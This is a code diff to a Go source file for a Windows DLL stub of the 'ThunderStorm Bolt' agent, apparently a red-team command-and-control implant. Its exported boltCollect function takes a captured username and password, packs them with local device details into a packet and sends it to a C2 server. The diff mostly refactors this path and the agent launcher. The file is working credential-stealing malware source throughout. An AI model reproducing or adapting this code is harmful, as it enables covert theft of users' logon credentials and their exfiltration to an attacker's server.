@@ -1,4 +1,22 @@
+//go:build windows
 // +build windows
+
+//
+// Copyright (C) 2021 iDigitalFlame
+//
+// This program is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// any later version.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with this program.  If not, see <https://www.gnu.org/licenses/>.
+//
 // ThunderStorm Bolt Agent Launcher Stub with Oneshot
 
 package main
@@ -9,28 +27,28 @@ import (
 
 	"github.com/iDigitalFlame/ThunderStorm/bolt"
 	"github.com/iDigitalFlame/xmt/c2"
+	"github.com/iDigitalFlame/xmt/c2/cfg"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/device"
-	"golang.org/x/sys/windows"
 )
-
-const boltCollectID = 77
-
-var boltUnlock = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetProcessVersion")
 
 func main() {}
 
 //export boltInit
 func boltInit() {
-	debug.SetMaxStack(256000000)
-	bolt.LaunchEx(
-		boltGuardian, boltFiles, boltKey, func() { boltUnlock.Call(13371) }, func() { boltUnlock.Call(13372) },
-	)
+	defer func() {
+		recover()
+	}()
+	debug.SetPanicOnFault(true)
+	bolt.Launch(boltGuardian, boltFiles, boltKey)
 }
 
 //export boltCollect
 func boltCollect(us C.int, u *C.char, ps C.int, p *C.char) {
-	debug.SetMaxStack(256000000)
+	defer func() {
+		recover()
+	}()
+	debug.SetPanicOnFault(true)
 	var (
 		ub, pb = []byte(C.GoStringN(u, us)), []byte(C.GoStringN(p, ps))
 		ur, pr = make([]rune, us/2), make([]rune, ps/2)
@@ -41,17 +59,13 @@ func boltCollect(us C.int, u *C.char, ps C.int, p *C.char) {
 	for i := 0; i < len(pb); i += 2 {
 		pr[i/2] = rune(pb[i])
 	}
-	var c c2.Config
-	if err := c.ReadBytes(boltConfig); err != nil {
-		return
-	}
-	i, err := c.Profile()
+	v, err := cfg.Raw(boltConfig)
 	if err != nil {
 		return
 	}
-	d := &com.Packet{ID: boltCollect}
-	d.WriteString(string(ur))
-	d.WriteString(string(pr))
-	device.Local.MarshalStream(d)
-	c2.Default.Oneshot(boltServer, nil, i, d)
+	n := &com.Packet{ID: 77}
+	n.WriteString(string(ur))
+	n.WriteString(string(pr))
+	device.Local.MarshalStream(n)
+	c2.Default.Shoot(boltServer, nil, v, n)
 }
